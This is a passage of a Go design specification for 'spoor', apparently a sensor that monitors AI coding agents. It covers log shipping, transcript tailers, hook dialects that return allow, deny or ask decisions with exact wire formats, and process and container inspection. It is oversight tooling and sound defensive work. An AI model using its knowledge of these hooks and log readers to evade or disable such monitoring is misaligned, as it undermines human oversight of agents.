type OTLPOptions struct{ Endpoint string; Headers map[string]string; Gzip bool; Timeout time.Duration; TLS *tls.Config; ServiceVersion string } // Endpoint like http://127.0.0.1:4318 (path /v1/logs appended when missing)
func NewOTLP(o OTLPOptions) (Sink, error) // treats 200/201/204 as success, parses partialSuccess.rejectedLogRecords > 0 as an error

// Shipper tails the Files segments and feeds a network Sink with at-least-once delivery, so the file log is the only queue.
type ShipperOptions struct{ Dir string; Checkpoint string; Batch int; Interval time.Duration }
func NewShipper(o ShipperOptions, dst Sink) *Shipper
func (s *Shipper) Run(ctx context.Context) error // reads complete lines only, checkpoints (segment name, offset) atomically after dst.Write succeeds, survives segment pruning, backs off on error
```

Tests: files sink concurrency (8 goroutines + 4 child processes via `go test` helper process appending 2,000 lines each: every line parses, none torn), segment roll and pruning, oversize shrink, Windows build; forward client against an in-test fake server that implements the handshake and acks, plus a REAL integration test gated by env `SPOOR_E2E_FLUENTBIT=1` that starts `docker run --rm --network host fluent/fluent-bit:latest` with forward+opentelemetry inputs and a file output and asserts records arrive (see ENV.md; the image is present locally; use unique ports); OTLP exporter against httptest server and the same real Fluent Bit; shipper crash/resume (no loss, bounded duplicates); OCSF mapping golden tests.

## A6. `internal/transcript` — incremental session-log readers

```go
package transcript

type Parser interface {
    AgentID() string
    // Match reports whether a file path is one of this agent's session logs.
    Match(path string) bool
    // ParseLine converts one complete line into zero or more events. st carries per-file state (session id, cwd, model, pending tool calls for pairing). It must tolerate unknown record types (count them in st.Unknown) and never panic.
    ParseLine(line []byte, st *FileState) ([]*event.Event, error)
}
type FileState struct {
    Path, SessionID, ParentSessionID, CWD, Model, Version, PermissionMode string
    Unknown, Malformed, Lines uint64
    Pending map[string]*event.Event // tool_use id -> tool.pre event, for pairing with results
    Extra   map[string]string
}
func Parsers() []Parser               // claude-jsonl, codex-rollout, copilot-events, gemini-chats
func ForFormat(id string) (Parser, bool)

type Checkpoint struct{ Offset int64; Size int64; FileID string; MTime int64 } // FileID: inode/dev on POSIX, file index on Windows
type TailerOptions struct {
    Roots       func() []Root // enumerated on every discovery pass: {Path glob, Parser, User}
    StateFile   string        // JSON checkpoint store, written atomically
    MaxLine     int           // default 8 MiB; longer lines are skipped and counted
    FromStart   bool          // first sight of a file: read from start (backfill) or from end
    MaxBackfill time.Duration // ignore files not modified within this window on first sight (default 24h)
    AllowUID    func(path string) bool // ownership check hook (root daemon must refuse files not owned by the home's user)
}
type Root struct{ Glob string; Parser Parser; User event.User }
func NewTailer(o TailerOptions) *Tailer
func (t *Tailer) Poll(ctx context.Context) ([]*event.Event, []Problem, error) // reads only complete (LF-terminated) lines, advances checkpoints, detects truncation (size < offset), replacement (FileID changed) and deletion of a file with a live session and reports them as Problems
type Problem struct{ Kind string; Path string; SessionID string; Detail string } // truncated | replaced | deleted | unreadable | schema_drift | symlink_refused | owner_mismatch
```

Requirements: open files with O_NOFOLLOW (POSIX) and refuse symlinks and non-regular files; never read past the last LF; events carry `Source: transcript`, `Fidelity: observed`, timestamps from the record, `Session.Transcript` set, `Tool.UseID` set so the engine can pair them with hook events; populate `Content` (ToolInput, ToolOutput, PromptText) for local detection. Tool-name to `event.ToolKind` mapping per agent (Claude: Bash→shell, Read→file_read, Write→file_write, Edit/MultiEdit/NotebookEdit→file_edit, Glob/Grep/LS→file_list, WebFetch→web_fetch, WebSearch→web_search, Task/Agent→subagent, `mcp__<server>__<tool>`→mcp with server/tool split; analogous tables for Codex (`shell`/`local_shell_call`/`apply_patch`/`exec_command`...), Copilot, Gemini (`run_shell_command`, `read_file`, `write_file`, `replace`, `web_fetch`, `google_web_search`, `mcp_<server>_<tool>`)). Export the mapping as `func ToolKindFor(agentID, toolName string) (event.ToolKind, string /*mcp server*/, string /*mcp tool*/)` so the hook package reuses it. Codex `.jsonl.zst` rollouts: support via klauspost/compress zstd for whole-file reads (no incremental tail of compressed files; they are archives). Record shapes: use `research/agent-surfaces-a.md`, `research/adr-sensor.md`, the parsers in `/home/user/uber/adr/Sensor/adr_sensor/parsers/` and `/home/user/fleetdm/fleet/orbit/pkg/table/ai_agent_sessions/` (if present in the sparse clone) as references for line shapes, and build realistic fixtures.
Tests: fixtures per agent covering prompt, tool call, tool result (ok and error), subagent, MCP call, unknown record type; incremental reads across appends; torn final line; truncation, replacement, deletion Problems; symlink refusal; 50 MB file performance sanity (generate, tail in under 2 s).

## A7. `internal/hookio` — hook dialects (pure functions)

```go
package hookio

type Decision struct{ Action string; Reason string; RuleID string } // Action: none | allow | deny | ask
type Request struct {
    AgentID   string
    EventName string // the agent's own hook event name
    Blocking  bool   // true when the agent will honour a deny for this event (pre-tool, prompt submit, permission request)
    Raw       map[string]any
}
type Dialect interface {
    ID() string // claude | codex | copilot | gemini | cursor
    // Parse converts one hook invocation (stdin bytes) into normalized events (usually one). env is the hook process environment (used for session/project fallbacks). Input cap 8 MiB, depth cap 64.
    Parse(stdin []byte, env map[string]string) ([]*event.Event, *Request, error)
    // Respond renders the agent-specific reply. For Action "none" it must produce output that lets the agent proceed unchanged (usually empty stdout, exit 0).
    Respond(req *Request, d Decision) (stdout []byte, stderr []byte, exitCode int)
    // Events lists the agent hook event names spoor wants registered, and whether each should be registered async (pure telemetry) when the agent supports it.
    Events() []HookEvent
}
type HookEvent struct{ Name string; Matcher string; Async bool; Blocking bool }
func Get(id string) (Dialect, bool)
func All() []Dialect
// Detect guesses the dialect from the payload when --agent was not given.
func Detect(stdin []byte, env map[string]string) (Dialect, bool)
```

Requirements per dialect, from `research/agent-surfaces-a.md` (verified wire formats): Claude Code (snake_case payload; `permission_mode` values mapped to event vocabulary; `tool_use_id`; `mcp_server`; `agent_id`/`agent_type` for subagents; deny = JSON `hookSpecificOutput.permissionDecision:"deny"` with reason on exit 0 for PreToolUse, `decision:"block"` for UserPromptSubmit; ask = `permissionDecision:"ask"`), Codex (same wire as Claude but `ask` and bare `allow` are unsupported: map ask to deny-with-reason only if the caller asked for block, otherwise none; exit 2 + stderr is the most compatible block), Copilot CLI (camelCase payload `sessionId,timestamp,cwd,toolName,toolArgs`, also the PascalCase/snake variant; output `permissionDecision`), Gemini CLI (`BeforeTool` etc.; `decision:"deny"`, `reason`; tool names `mcp_<server>_<tool>`), Cursor (event names in the report; `permission: "deny"|"allow"|"ask"`, `user_message`/`agent_message`; mark UNVERIFIED parts). Map every agent event to the `event.Type*` constants; populate `Content`, `Tool`, `Target` (command for shell tools, path for file tools, url/host for web tools, query for search), `Session`, `Agent{ID}`, `Source: hook`, `Fidelity: observed`. Reuse `transcript.ToolKindFor` if it exists when you finish; otherwise keep a local table and note it.
Tests: golden payloads per dialect and event (copy the verbatim examples from the report), round-trip of Respond for deny/ask/none, malformed and oversized stdin, Detect.

## A8. `internal/platform` — OS layer

```go
package platform

type UserHome struct{ Name, UID, Home string }
type Proc struct {
    PID, PPID int
    Name, Exe string
    Args      []string
    Start     time.Time
    UID, User string
}
func HostInfo() event.Host                   // ID must equal osquery system_info.uuid where derivable: Linux /sys/class/dmi/id/product_uuid (root) then /etc/machine-id formatted as UUID fallback; macOS IOPlatformUUID via `ioreg -rd1 -c IOPlatformExpertDevice` (absolute path /usr/sbin/ioreg, 5 s timeout) ; Windows SMBIOS UUID via registry/WMI-free method if possible else `HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid`. Report which source was used: func HostIDSource() string. Allow override with env SPOOR_HOST_ID and a file <config dir>/host_id (written by the osquery extension, which can ask osquery directly).
func Users() ([]UserHome, error)             // real human accounts with existing homes: /Users/* (skip Shared, Guest), /home/* + /root, C:\Users\* (skip Public, Default*, All Users); when not privileged, only the current user
func CurrentUser() UserHome
func IsPrivileged() bool
func Processes() ([]Proc, error)             // pure Go: /proc on Linux; sysctl kern.proc.all + kern.procargs2 on macOS via golang.org/x/sys/unix; Toolhelp32 snapshot + NtQueryInformationProcess/ReadProcessMemory for command line on Windows via golang.org/x/sys/windows. Missing fields are left empty, never an error for one process.
func ProcEnv(pid int) (map[string]string, error) // Linux /proc/<pid>/environ; macOS kern.procargs2 (own user or root); Windows PEB read (best effort; return ErrUnsupported cleanly when not possible)
func ProcCWD(pid int) (string, error)
var ErrUnsupported = errors.New("unsupported on this platform")

type Dirs struct{ Config, Data, Events, Spool, Run, Socket, StateDB string }
func DefaultDirs() Dirs // root/system defaults: Linux /etc/spoor, /var/lib/spoor, /var/lib/spoor/events, /var/lib/spoor/spool, /run/spoor, /run/spoor/hook.sock, /var/lib/spoor/state.db ; macOS /Library/Application Support/spoor/..., socket /var/run/spoor/hook.sock ; Windows %ProgramData%\spoor\..., socket = %ProgramData%\spoor\run\hook.sock (AF_UNIX works on Windows 10 1803+)
func UserDirs(home string) Dirs // unprivileged fallback: ~/.local/state/spoor (Linux), ~/Library/Application Support/spoor (macOS), %LOCALAPPDATA%\spoor (Windows)
// Safe file helpers for a root process reading user-controlled trees:
func OpenNoFollow(path string) (*os.File, error)  // refuses symlinks on the final component (O_NOFOLLOW; on Windows FILE_FLAG_OPEN_REPARSE_POINT + reparse check) and non-regular files
func FileID(fi os.FileInfo, path string) string    // dev:inode on POSIX, volume:index on Windows
func OwnerUID(fi os.FileInfo) (string, bool)
func PeerCred(c net.Conn) (uid string, pid int, err error) // SO_PEERCRED on Linux, LOCAL_PEERCRED/LOCAL_PEERPID on macOS, ErrUnsupported on Windows
func ContainerOf(pid int) (id, runtime string)       // Linux: parse /proc/<pid>/cgroup for docker, containerd (cri-containerd-<id>.scope, /kubepods/.../<id>), cri-o (crio-<id>.scope), podman (libpod-<id>.scope), cgroup v1 and v2; other OS: "", ""
func PodOf(pid int) (podUID string)                   // from the kubepods cgroup path (both pod<uid> and pod<uid with underscores> forms)
```

Use build-tagged files (`_linux.go`, `_darwin.go`, `_windows.go`, plus `_other.go` stubs so every GOOS builds). Do not import gopsutil (keep the dependency surface small). Tests: Linux tests run for real against `/proc` (current process must be found with correct exe/args/env); parsing functions for macOS procargs2 buffers and cgroup lines are pure and unit-tested on all platforms with fixtures (cgroup v1 docker, cgroup v2 containerd under kubepods with systemd slices, cri-o, podman rootless); `go vet` passes for all three GOOS.
